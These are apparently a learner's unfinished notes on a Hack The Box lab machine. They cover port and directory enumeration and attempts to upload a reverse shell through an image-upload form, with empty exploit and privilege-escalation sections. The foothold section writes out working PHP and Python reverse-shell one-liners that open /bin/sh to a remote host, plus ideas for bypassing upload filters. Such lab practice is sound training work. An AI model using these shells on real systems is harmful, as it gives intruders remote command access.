# RELEASE ARENA

# Enumeration

## nmap 
`nmap -sV -A -v 10.129.48.251` returned:
![[Screenshot 2022-04-25 at 07.21.24.png]]
I believe the _GET HEAD_ header option can be interesting..

running a UDP scan:
![[Screenshot 2022-04-26 at 07.23.10.png]]
## curl
`curl -X GET HEAD http://late.htb -i
found __"http://images.late.htb/ __ in the curl results -> given us a subdomain 

## http
headroom.js --> different functions of [headers](https://wicky.nillia.ms/headroom.js/) 
FLASK + FILE UPLOAD
Looking at the bottom of the page, there's a link to who designed the website: A _Kavi.gihan_. this could help give us a user account of sorts..

## gobuster
![[Screenshot 2022-04-25 at 19.28.31.png]]
A quite strange gobuster scan result...

_/contacts.html_ and /assets/ were the only ones found.

# Foothold
## file upload
Trying to use the php reverse shell from pentestmonkey, uploading it with the .jpg file extension did not work and this error message showed:
![[Screenshot 2022-04-25 at 11.10.15.png]]

Using a [text to image converter](https://smallseotools.com/text-to-image/) I tried uploading a nc reverse shell. The results.txt file showed that the text was clearly read and saved as a paragraph in some html code:
![[Screenshot 2022-04-26 at 09.51.32.png]]. Problem is, this does not really get executed..
Then I remembered it is written with flask, so I proceeded to try both the PHP and Python oneliners:
`php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

### burp
I tried changing `image/jpeg` to `image/jpg`, `txt/jpg`, `txt/jpeg` but this did not work. 
That being said, the POST form looked like so:
![[Screenshot 2022-04-25 at 11.23.58.png]]
_WITH_ the reverse shell file it looked like this:
![[Screenshot 2022-04-25 at 11.25.01.png]]. It is clear that the application 'recognises' (or at least tries to) the file type..
Changing the extension to JPEG returned an _Invalid Extension_ error message, so it is clear they want jpg.
`<input type="file" name="file" class="custom-file-input" id="inputGroupFile01" aria-describedby="inputGroupFileAddon01" accept="image/*">` is the html code for the input form.
![[Screenshot 2022-04-25 at 11.36.06.png]]

What I noticed is, every time I try to upload the files, the extension code changes. I.E:  '/home/svc_acc/app/uploads/php-reverse-shell.php.jpg6645' --> the last part has random numbers attached. But this also tells me there is a server somewhere with a file system.  '/home/svc_acc/app/uploads/pic.jpg4289'.

Trying to upload an actual jpeg, I see that the starter text code is `ÿØÿàJFIF`[PNG begins with `PNG`]. Uploadin this gave me a file _results.txt_! This returns the website that I found the picture on and its ID - for JPEG files, and the name from PNG.

### source code
`<!-- Social links. @TODO: replace by link/instructions in template -->` this could mean there is something with the template

## SSH
It looks like its supported, but dont really have a hint on a user yet
# Exploit
# Privesc

# Flags
# Thoughts
- `ETag: "624af46d-24f5"` could indicate that thre are older versions --> might be some forgotten credentials on these
- upload an image (might be filtering for jpg/jpeg/etc) so use a reverse shell from pentestmonkey but make it one of those file extensions.
- upload image with the reverse shell code appended to the end? Edit in burp
- The numbers added to the end, shows all the files are uploaded to a server, but if theyre 'invalid' they will be stored with random numbers on the back --> HOW TO BYPASS THIS?
- create image with payload? 
- executing commands as a shell
- creating a python server?
- 
# New Things Learnt
- file filtering [bypass](https://infosecwriteups.com/bypassed-and-uploaded-a-sweet-reverse-shell-d15e1bbf5836)
- upload [vulnerabilities](https://www.onsecurity.io/blog/file-upload-checklist/)


# helpful writeups (?)
- https://infosecwriteups.com/htb-passage-writeup-172490d4045e
